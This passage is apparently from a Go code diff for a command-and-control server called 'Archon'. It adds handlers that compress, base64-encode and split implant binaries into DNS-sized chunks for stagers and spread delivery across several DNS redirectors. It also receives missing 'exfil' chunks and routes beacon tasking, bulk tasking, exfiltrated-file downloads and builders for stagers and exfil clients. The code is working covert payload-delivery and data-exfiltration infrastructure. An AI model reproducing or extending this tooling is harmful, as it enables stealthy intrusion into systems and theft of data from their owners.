+		return "", "", 0, "", fmt.Errorf("failed to compress client: %w", err)
+	}
+	gzWriter.Close()
+
+	compressed := compressedBuf.Bytes()
+	fmt.Printf("[Archon] Compressed: %d bytes -> %d bytes (%.1f%% reduction)\n",
+		len(clientData), len(compressed),
+		100.0*(1.0-float64(len(compressed))/float64(len(clientData))))
+
+	// Base64 encode
+	base64Data := base64.StdEncoding.EncodeToString(compressed)
+	fmt.Printf("[Archon] Base64 encoded: %d bytes\n", len(base64Data))
+
+	// Calculate total chunks
+	// DNS UDP limit: 512 bytes - headers (~125 bytes) - "CHUNK|" (6 bytes) - TXT overhead (~10 bytes) = ~370 bytes safe
+	const chunkSize = 370
+	totalChunks := (len(base64Data) + chunkSize - 1) / chunkSize
+
+	fmt.Printf("[Archon] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)
+
+	// Get active DNS domains for the client_binaries record
+	dnsServers, err := api.db.GetDNSServers()
+	var dnsDomains []string
+	if err == nil {
+		for _, server := range dnsServers {
+			if status, ok := server["status"].(string); ok && status == "active" {
+				if domain, ok := server["domain"].(string); ok {
+					dnsDomains = append(dnsDomains, domain)
+				}
+			}
+		}
+	}
+	dnsDomainsStr := strings.Join(dnsDomains, ",")
+
+	// Ensure this beacon exists in client_binaries table (needed for foreign key constraint)
+	err = api.db.UpsertClientBinary(beaconID, filepath.Base(clientPath), osType, arch,
+		len(clientData), len(compressed), len(base64Data), totalChunks, base64Data, dnsDomainsStr, checksum)
+	if err != nil {
+		return "", "", 0, "", fmt.Errorf("failed to register client binary in database: %w", err)
+	}
+
+	return beaconID, base64Data, totalChunks, checksum, nil
+} // handleStagerInit processes stager initialization (STG message forwarded from DNS server)
+func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
+	var req StagerInitRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Stager init request: %s (%s/%s) via DNS server %s\n",
+			req.StagerIP, req.OS, req.Arch, dnsServerID)
+	}
+
+	// Load and process client binary from filesystem
+	clientBinaryID, base64Data, totalChunks, sha256Checksum, err := api.loadAndProcessClientBinary(req.OS, req.Arch)
+	if err != nil {
+		// Always log this error - critical for troubleshooting
+		fmt.Printf("[API] Failed to load client binary for %s/%s: %v\n", req.OS, req.Arch, err)
+		api.sendError(w, http.StatusNotFound, fmt.Sprintf("failed to load client binary: %v", err))
+		return
+	}
+
+	// Safe checksum display (handle short checksums)
+	checksumDisplay := sha256Checksum
+	if len(checksumDisplay) > 16 {
+		checksumDisplay = checksumDisplay[:16]
+	}
+	fmt.Printf("[API] Loaded client binary: %s (%d chunks, checksum: %s)\n", clientBinaryID, totalChunks, checksumDisplay)
+
+	// Create stager session with DETERMINISTIC ID based on stager IP + binary ID
+	// This ensures Shadow Mesh works correctly - all DNS servers generate the same session ID
+	sessionID := generateDeterministicStagerSessionID(req.StagerIP, clientBinaryID)
+
+	err = api.db.CreateStagerSession(
+		sessionID,
+		req.StagerIP,
+		req.OS,
+		req.Arch,
+		clientBinaryID,
+		dnsServerID,
+		totalChunks,
+	)
+
+	if err != nil {
+		// Always log this error (not just in debug mode) - critical for troubleshooting
+		fmt.Printf("[API] Failed to create stager session: %v\n", err)
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create stager session: %v", err))
+		return
+	}
+
+	// Get active DNS servers for distribution
+	dnsServers, err := api.db.GetDNSServers()
+	if err != nil || len(dnsServers) == 0 {
+		api.sendError(w, http.StatusInternalServerError, "no DNS servers available")
+		return
+	}
+
+	// Extract DNS server IDs and domains
+	var dnsServerIDs []string
+	var dnsDomains []string
+	for _, server := range dnsServers {
+		status, _ := server["status"].(string)
+		if status == "active" {
+			if id, ok := server["id"].(string); ok {
+				domain, _ := server["domain"].(string)
+				dnsServerIDs = append(dnsServerIDs, id)
+				dnsDomains = append(dnsDomains, domain)
+			}
+		}
+	}
+
+	if len(dnsServerIDs) == 0 {
+		api.sendError(w, http.StatusInternalServerError, "no active DNS servers")
+		return
+	}
+
+	// Split base64 data into chunks
+	// DNS UDP limit: 512 bytes - headers (~125 bytes) - "CHUNK|" (6 bytes) - TXT overhead (~10 bytes) = ~370 bytes safe
+	const chunkSize = 370
+	var chunks []string
+	for i := 0; i < len(base64Data); i += chunkSize {
+		end := i + chunkSize
+		if end > len(base64Data) {
+			end = len(base64Data)
+		}
+		chunks = append(chunks, base64Data[i:end])
+	}
+
+	// Assign chunks to DNS servers (round-robin)
+	err = api.db.AssignStagerChunks(sessionID, clientBinaryID, chunks, dnsServerIDs)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to assign chunks")
+		if api.config.Debug {
+			fmt.Printf("[API] Failed to assign chunks: %v\n", err)
+		}
+		return
+	}
+
+	// Always log stager session creation (not just in debug mode)
+	fmt.Printf("[API] Stager session created: %s | Stager: %s (%s/%s) | Chunks: %d across %d DNS servers\n",
+		sessionID, req.StagerIP, req.OS, req.Arch, totalChunks, len(dnsServerIDs))
+
+	if api.config.Debug {
+		fmt.Printf("[API] DNS domains available: %v\n", dnsDomains)
+	}
+
+	// Return simple session info (domains are compiled into stager now)
+	response := StagerInitResponse{
+		SessionID:      sessionID,
+		TotalChunks:    totalChunks,
+		DNSDomains:     nil,            // Not needed - stager has domains compiled in
+		ChunkSize:      370,            // DNS-safe chunk size
+		SHA256Checksum: sha256Checksum, // For binary signature verification
+	}
+
+	api.sendJSON(w, response)
+}
+
+// StagerChunkRequest represents a chunk request from DNS server
+type StagerChunkRequest struct {
+	SessionID  string `json:"session_id"`
+	ChunkIndex int    `json:"chunk_index"`
+	StagerIP   string `json:"stager_ip"`
+}
+
+// StagerChunkResponse contains chunk data
+type StagerChunkResponse struct {
+	ChunkIndex int    `json:"chunk_index"`
+	ChunkData  string `json:"chunk_data"`
+	Success    bool   `json:"success"`
+	Message    string `json:"message,omitempty"`
+}
+
+// handleStagerChunk processes chunk requests (ACK message forwarded from DNS server)
+func (api *APIServer) handleStagerChunk(w http.ResponseWriter, r *http.Request) {
+	var req StagerChunkRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Get chunk from database
+	chunkData, assignedDNS, err := api.db.GetStagerChunk(req.SessionID, req.ChunkIndex)
+	if err != nil {
+		api.sendJSON(w, StagerChunkResponse{
+			ChunkIndex: req.ChunkIndex,
+			Success:    false,
+			Message:    "chunk not found",
+		})
+		return
+	}
+
+	// Mark chunk as delivered
+	if err := api.db.MarkStagerChunkDelivered(req.SessionID, req.ChunkIndex); err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to mark chunk as delivered: %v\n", err)
+		}
+	}
+
+	// Update session activity
+	api.db.UpdateStagerSessionActivity(req.SessionID)
+
+	// Log chunk delivery (always, not just debug)
+	fmt.Printf("[API] Chunk %d delivered to stager %s via DNS server %s\n",
+		req.ChunkIndex, req.StagerIP, dnsServerID)
+
+	if api.config.Debug {
+		fmt.Printf("[API] Debug: Session %s, assigned to %s\n", req.SessionID, assignedDNS)
+	}
+
+	// Return chunk data
+	response := StagerChunkResponse{
+		ChunkIndex: req.ChunkIndex,
+		ChunkData:  chunkData,
+		Success:    true,
+	}
+
+	api.sendJSON(w, response)
+}
+
+// StagerContactRequest represents a stager making first contact with DNS server
+type StagerContactRequest struct {
+	DNSServerID    string `json:"dns_server_id"`
+	ApiKey         string `json:"api_key"`
+	ClientBinaryID string `json:"client_binary_id"`
+	StagerIP       string `json:"stager_ip"`
+	OS             string `json:"os"`
+	Arch           string `json:"arch"`
+	TotalChunks    int    `json:"total_chunks,omitempty"`
+}
+
+// StagerProgressRequest represents a progress report from DNS server
+type StagerProgressRequest struct {
+	DNSServerID string `json:"dns_server_id"`
+	SessionID   string `json:"session_id"`
+	ChunkIndex  int    `json:"chunk_index"`
+	StagerIP    string `json:"stager_ip"`
+}
+
+// generateDeterministicStagerSessionID creates a consistent session ID based on stager IP + binary ID
+// This ensures all DNS servers generate the same session ID for the same stager deployment
+// Critical for Shadow Mesh: stager load-balances across multiple DNS servers
+// sha256Hash returns hex-encoded SHA256 hash of input string
+func sha256Hash(data string) string {
+	hash := sha256.Sum256([]byte(data))
+	return hex.EncodeToString(hash[:])
+}
+
+func generateDeterministicStagerSessionID(stagerIP, clientBinaryID string) string {
+	// Hash stager IP + client binary ID to get deterministic session ID
+	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
+	hash := sha256.Sum256([]byte(data))
+
+	// Use first 4 hex chars from hash (16 bits) - matches stg_XXXX format
+	hashHex := hex.EncodeToString(hash[:])
+	return fmt.Sprintf("stg_%s", hashHex[:4])
+}
+
+// handleStagerContact records when a stager makes first contact with a DNS server (from cache)
+// This does NOT create a new session - the session was already created when Master built the stager
+func (api *APIServer) handleStagerContact(w http.ResponseWriter, r *http.Request) {
+	var req StagerContactRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	// Create a stager session when contact is made from cache
+	// Generate DETERMINISTIC session ID based on stager IP + binary ID
+	// This ensures all DNS servers use the same session ID for the same stager
+	sessionID := generateDeterministicStagerSessionID(req.StagerIP, req.ClientBinaryID)
+
+	// Get total chunks - use request value first, fallback to database lookup
+	chunkCount := req.TotalChunks
+	if chunkCount == 0 {
+		var err error
+		chunkCount, err = api.db.GetCachedChunkCount(req.ClientBinaryID)
+		if err != nil {
+			fmt.Printf("[API] Warning: Could not get chunk count for cached binary %s: %v\n", req.ClientBinaryID, err)
+		}
+	}
+
+	// Create stager session in database for UI tracking
+	err := api.db.CreateStagerSession(
+		sessionID,
+		req.StagerIP,
+		req.OS,
+		req.Arch,
+		req.ClientBinaryID,
+		dnsServerID,
+		chunkCount,
+	)
+
+	if err != nil {
+		// Log error but don't fail - DNS server already serving from cache
+		fmt.Printf("[API] Warning: Failed to create stager session for tracking: %v\n", err)
+	} else {
+		fmt.Printf("[API] Stager session created from cache contact: %s | Stager: %s (%s/%s) | Binary: %s | Chunks: %d\n",
+			sessionID, req.StagerIP, req.OS, req.Arch, req.ClientBinaryID, chunkCount)
+	}
+
+	// Log the contact
+	fmt.Printf("[API] Stager contact: %s (%s/%s) contacted DNS server %s using cached binary %s\n",
+		req.StagerIP, req.OS, req.Arch, dnsServerID, req.ClientBinaryID)
+
+	// Return success with session ID for DNS server to use in progress reports
+	api.sendSuccess(w, "contact recorded", map[string]interface{}{
+		"session_id": sessionID,
+	})
+}
+
+// handleStagerProgress processes stager chunk delivery progress reports from DNS servers
+func (api *APIServer) handleStagerProgress(w http.ResponseWriter, r *http.Request) {
+	var req StagerProgressRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	// Mark chunk as delivered in database
+	if err := api.db.MarkStagerChunkDelivered(req.SessionID, req.ChunkIndex); err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to mark chunk %d as delivered: %v\n", req.ChunkIndex, err)
+		}
+	}
+
+	// Update session activity
+	api.db.UpdateStagerSessionActivity(req.SessionID)
+
+	// Log progress (periodic batching could reduce logs)
+	if req.ChunkIndex%100 == 0 || api.config.Debug {
+		fmt.Printf("[API] Progress: Chunk %d delivered for session %s via DNS %s\n",
+			req.ChunkIndex, req.SessionID, dnsServerID)
+	}
+
+	api.sendSuccess(w, "progress recorded", nil)
+}
+
+// MissingChunksRequest represents chunks being sent by a DNS server to fill gaps
+type MissingChunksRequest struct {
+	DNSServerID string            `json:"dns_server_id"`
+	APIKey      string            `json:"api_key"`
+	ID          string            `json:"id"`     // task_id or session_id
+	Type        string            `json:"type"`   // "task" or "exfil"
+	Chunks      map[string]string `json:"chunks"` // chunk_index -> base64 data
+}
+
+// handleMissingChunks receives missing chunks from DNS servers
+func (api *APIServer) handleMissingChunks(w http.ResponseWriter, r *http.Request) {
+	var req MissingChunksRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if len(req.Chunks) == 0 {
+		api.sendSuccess(w, "no chunks to process", nil)
+		return
+	}
+
+	// Decode chunks from base64
+	chunks := make(map[int][]byte)
+	for idxStr, b64Data := range req.Chunks {
+		idx, err := strconv.Atoi(idxStr)
+		if err != nil {
+			fmt.Printf("[API] Warning: Invalid chunk index %q: %v\n", idxStr, err)
+			continue
+		}
+		data, err := base64.StdEncoding.DecodeString(b64Data)
+		if err != nil {
+			fmt.Printf("[API] Warning: Failed to decode chunk %s: %v\n", idxStr, err)
+			continue
+		}
+		chunks[idx] = data
+	}
+
+	if req.Type == "task" {
+		if err := api.db.ReceiveMissingChunks(req.ID, chunks, dnsServerID); err != nil {
+			fmt.Printf("[API] Error receiving missing chunks for task %s: %v\n", req.ID, err)
+			api.sendError(w, http.StatusInternalServerError, "failed to process chunks")
+			return
+		}
+		fmt.Printf("[API] Received %d missing chunks for task %s from DNS %s\n", len(chunks), req.ID, dnsServerID)
+	} else if req.Type == "exfil" {
+		if err := api.db.ReceiveMissingExfilChunks(req.ID, chunks, dnsServerID); err != nil {
+			fmt.Printf("[API] Error receiving missing exfil chunks for session %s: %v\n", req.ID, err)
+			api.sendError(w, http.StatusInternalServerError, "failed to process exfil chunks")
+			return
+		}
+		fmt.Printf("[API] Received %d missing exfil chunks for session %s from DNS %s\n", len(chunks), req.ID, dnsServerID)
+	} else {
+		api.sendError(w, http.StatusBadRequest, fmt.Sprintf("unknown chunk type: %s", req.Type))
+		return
+	}
+
+	api.sendSuccess(w, "chunks received", map[string]interface{}{
+		"received": len(chunks),
+	})
+}
+
+// panicRecoveryMiddleware catches panics and prevents server crashes
+func (api *APIServer) panicRecoveryMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		defer func() {
+			if err := recover(); err != nil {
+				fmt.Printf("[API] PANIC RECOVERED: %v\nPath: %s %s\n", err, r.Method, r.URL.Path)
+				// Try to send error response (might fail if headers already sent)
+				w.WriteHeader(http.StatusInternalServerError)
+				json.NewEncoder(w).Encode(map[string]interface{}{
+					"success": false,
+					"message": "internal server error",
+				})
+			}
+		}()
+		next.ServeHTTP(w, r)
+	})
+}
+
+// SetupRoutes configures all API routes
+func (api *APIServer) SetupRoutes(router *mux.Router) {
+	// Add panic recovery middleware to all routes
+	router.Use(api.panicRecoveryMiddleware)
+
+	// Web UI endpoints (serve HTML)
+	router.HandleFunc("/", api.handleRoot).Methods("GET")
+	router.HandleFunc("/login", api.handleLoginPage).Methods("GET")
+	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
+	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
+	router.HandleFunc("/dns-servers", api.handleDNSServersPage).Methods("GET")
+	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")
+	router.HandleFunc("/stager", api.handleStagerPage).Methods("GET")
+	router.HandleFunc("/exfils", api.handleExfilsPage).Methods("GET")
+	router.HandleFunc("/users", api.handleUsersPage).Methods("GET")
+	router.HandleFunc("/logs", api.handleLogsPage).Methods("GET")
+	router.HandleFunc("/report", api.handleReportPage).Methods("GET")
+
+	// Serve static files (CSS, JS, images) - support both /web/static/ and /static/
+	staticHandler := http.StripPrefix("/static/", http.FileServer(http.Dir(filepath.Join(api.config.WebRoot, "static"))))
+	router.PathPrefix("/static/").Handler(staticHandler)
+	router.PathPrefix("/web/static/").Handler(
+		http.StripPrefix("/web/static/", http.FileServer(http.Dir(filepath.Join(api.config.WebRoot, "static")))),
+	)
+
+	// WebSocket endpoint (auth via cookie)
+	router.HandleFunc("/ws", api.handleWebSocket).Methods("GET")
+
+	// Public API endpoints (no auth required) - with strict rate limiting
+	authRouter := router.PathPrefix("/api/auth").Subrouter()
+	authRouter.Use(api.rateLimitMiddleware(api.authLimiter))
+	authRouter.HandleFunc("/login", api.handleLogin).Methods("POST")
+
+	// Operator endpoints (JWT auth required) - with standard rate limiting
+	operatorRouter := router.PathPrefix("/api").Subrouter()
+	operatorRouter.Use(api.rateLimitMiddleware(api.apiLimiter))
+	operatorRouter.Use(api.authMiddleware)
+	operatorRouter.Use(api.csrfMiddleware) // CSRF protection for web UI
+
+	operatorRouter.HandleFunc("/auth/logout", api.handleLogout).Methods("POST")
+	operatorRouter.HandleFunc("/auth/me", api.handleCurrentUser).Methods("GET")
+
+	// User management endpoints
+	operatorRouter.HandleFunc("/operators", api.handleListOperators).Methods("GET")
+	operatorRouter.HandleFunc("/operators/{id}", api.handleGetOperator).Methods("GET")
+	operatorRouter.HandleFunc("/operators", api.handleCreateOperator).Methods("POST")
+	operatorRouter.HandleFunc("/operators/{id}", api.handleUpdateOperator).Methods("PUT")
+	operatorRouter.HandleFunc("/operators/{id}/password", api.handleChangePassword).Methods("POST")
+	operatorRouter.HandleFunc("/operators/{id}", api.handleDeleteOperator).Methods("DELETE")
+	operatorRouter.HandleFunc("/operators/{id}/status", api.handleToggleOperatorStatus).Methods("POST")
+
+	operatorRouter.HandleFunc("/dns-servers", api.handleListDNSServers).Methods("GET")
+	operatorRouter.HandleFunc("/dns-servers/{id}", api.handleDeleteDNSServer).Methods("DELETE")
+	operatorRouter.HandleFunc("/beacons", api.handleListBeacons).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}", api.handleGetBeacon).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}/build-config", api.handleGetBeaconBuildConfig).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}/dns-contacts", api.handleGetBeaconDNSContacts).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}/domains", api.handleGetBeaconDomains).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}/domains", api.handleUpdateBeaconDomain).Methods("PUT")
+	operatorRouter.HandleFunc("/beacons/{id}/domains", api.handleAddBeaconDomain).Methods("POST")
+	operatorRouter.HandleFunc("/beacons/{id}", api.handleDeleteBeacon).Methods("DELETE")
+	operatorRouter.HandleFunc("/beacons/{id}/task", api.handleCreateTask).Methods("POST")
+	operatorRouter.HandleFunc("/tasks", api.handleListTasks).Methods("GET")
+	operatorRouter.HandleFunc("/tasks/{id}", api.handleGetTask).Methods("GET")
+	operatorRouter.HandleFunc("/tasks/{id}", api.handleDeleteTask).Methods("DELETE")
+	operatorRouter.HandleFunc("/tasks/{id}/result", api.handleGetTaskResult).Methods("GET")
+	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
+	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleGetTaskStatus).Methods("GET")
+	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")
+	operatorRouter.HandleFunc("/timeline", api.handleTimeline).Methods("GET")
+	operatorRouter.HandleFunc("/exfil/transfers", api.handleListExfilTransfers).Methods("GET")
+	operatorRouter.HandleFunc("/exfil/transfers/{id}", api.handleGetExfilTransfer).Methods("GET")
+	operatorRouter.HandleFunc("/exfil/transfers/{id}/download", api.handleDownloadExfilArtifact).Methods("GET")
+
+	// Builder endpoints
+	operatorRouter.HandleFunc("/builder/dns-server", api.handleBuildDNSServer).Methods("POST")
+	operatorRouter.HandleFunc("/builder/client", api.handleBuildClient).Methods("POST")
+	operatorRouter.HandleFunc("/builder/exfil-client", api.handleBuildExfilClient).Methods("POST")
+	operatorRouter.HandleFunc("/builder/exfil-client/jobs", api.handleListExfilBuildJobs).Methods("GET")
+	operatorRouter.HandleFunc("/builder/exfil-client/jobs/{id}", api.handleGetExfilBuildJob).Methods("GET")
+	operatorRouter.HandleFunc("/builder/exfil-client/builds", api.handleListExfilClientBuilds).Methods("GET")
+	operatorRouter.HandleFunc("/builder/client-binaries", api.handleListClientBinaries).Methods("GET")
+	operatorRouter.HandleFunc("/builder/stager", api.handleBuildStager).Methods("POST")
+	operatorRouter.HandleFunc("/builder/builds", api.handleListBuilds).Methods("GET")
+	operatorRouter.HandleFunc("/builder/builds/download", api.handleDownloadBuild).Methods("GET")
+	operatorRouter.HandleFunc("/builder/builds/delete", api.handleDeleteBuild).Methods("DELETE")
+
+	// Stager session endpoints
+	operatorRouter.HandleFunc("/stager/sessions", api.handleListStagerSessions).Methods("GET")
+	operatorRouter.HandleFunc("/stager/sessions/{id}", api.handleGetStagerSession).Methods("GET")
+	operatorRouter.HandleFunc("/stager/sessions/{id}", api.handleDeleteStagerSession).Methods("DELETE")
+	operatorRouter.HandleFunc("/stager/sessions/{id}/status", api.handleUpdateStagerSessionStatus).Methods("PATCH")
+
+	// Exfil transfer management endpoints
+	operatorRouter.HandleFunc("/exfil/transfers/{id}", api.handleDeleteExfilTransfer).Methods("DELETE")
+	operatorRouter.HandleFunc("/exfil/transfers/{id}/status", api.handleUpdateExfilTransferStatus).Methods("PATCH")
+
+	// Task management endpoints
+	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleUpdateTaskStatus).Methods("PATCH")
+
+	// Bulk operation endpoints
+	operatorRouter.HandleFunc("/tasks/bulk", api.handleBulkTaskAction).Methods("POST")
+	operatorRouter.HandleFunc("/beacons/bulk/task", api.handleBulkBeaconTask).Methods("POST")
+
+	// Log viewing endpoints
+	operatorRouter.HandleFunc("/logs", api.handleGetLogs).Methods("GET")
+	operatorRouter.HandleFunc("/logs/files", api.handleListLogFiles).Methods("GET")
+
+	// Infrastructure map endpoint
+	operatorRouter.HandleFunc("/infrastructure", api.handleGetInfrastructure).Methods("GET")
+
+	// DNS server endpoints (API key auth required) - with high rate limits
+	dnsRouter := router.PathPrefix("/api/dns-server").Subrouter()
+	dnsRouter.Use(api.rateLimitMiddleware(api.dnsLimiter))
+	dnsRouter.Use(api.dnsServerAuthMiddleware)
+
+	dnsRouter.HandleFunc("/register", api.handleDNSServerRegistration).Methods("POST")
+	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
+	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
+	dnsRouter.HandleFunc("/beacon-status", api.handleBeaconStatusUpdate).Methods("POST")
+	dnsRouter.HandleFunc("/logs", api.handleDNSServerLogs).Methods("POST")
+	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
+	dnsRouter.HandleFunc("/result/complete", api.handleResultComplete).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/chunk", api.handleSubmitExfilChunk).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/chunk/tagged", api.handleSubmitExfilChunkByTag).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/tag", api.handleRegisterExfilTag).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/complete/tagged", api.handleExfilCompleteByTag).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/complete", api.handleExfilComplete).Methods("POST")
+	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
+	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
+	dnsRouter.HandleFunc("/tasks/delivered", api.handleMarkTaskDelivered).Methods("POST")
+	dnsRouter.HandleFunc("/task-statuses", api.handleGetTaskStatusesForDNSServer).Methods("GET")
+	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")
+
+	// Stager protocol endpoints (called by DNS servers on behalf of stagers)
+	dnsRouter.HandleFunc("/stager/init", api.handleStagerInit).Methods("POST")
+	dnsRouter.HandleFunc("/stager/chunk", api.handleStagerChunk).Methods("POST")
+	dnsRouter.HandleFunc("/stager/contact", api.handleStagerContact).Methods("POST")
+	dnsRouter.HandleFunc("/stager/progress", api.handleStagerProgress).Methods("POST")
+
+	// Missing chunk recovery endpoint
+	dnsRouter.HandleFunc("/missing-chunks", api.handleMissingChunks).Methods("POST")
+
+	// Health check endpoint (no auth)
+	router.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("OK"))
+	}).Methods("GET")
+}
+
+// Web UI Handlers
+
+func (api *APIServer) handleRoot(w http.ResponseWriter, r *http.Request) {
+	http.Redirect(w, r, "/login", http.StatusSeeOther)
+}
+
+func serveNoCache(w http.ResponseWriter, r *http.Request, path string) {
+	w.Header().Set("Cache-Control", "no-store")
+	http.ServeFile(w, r, path)
+}
+
+func (api *APIServer) handleLoginPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "login.html"))
+}
+
+func (api *APIServer) handleDashboardPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "dashboard.html"))
+}
+
+func (api *APIServer) handleBeaconPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "beacon.html"))
+}
+
+func (api *APIServer) handleDNSServersPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "dns-servers.html"))
+}
+
+func (api *APIServer) handleUsersPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "users.html"))
+}
+
+func (api *APIServer) handleStagerPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "stager.html"))
+}
+
+func (api *APIServer) handleExfilsPage(w http.ResponseWriter, r *http.Request) {
+	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "exfils.html"))
+}
+
+func (api *APIServer) handleLogsPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "logs.html"))
+}
+
+func (api *APIServer) handleReportPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "report.html"))
+}
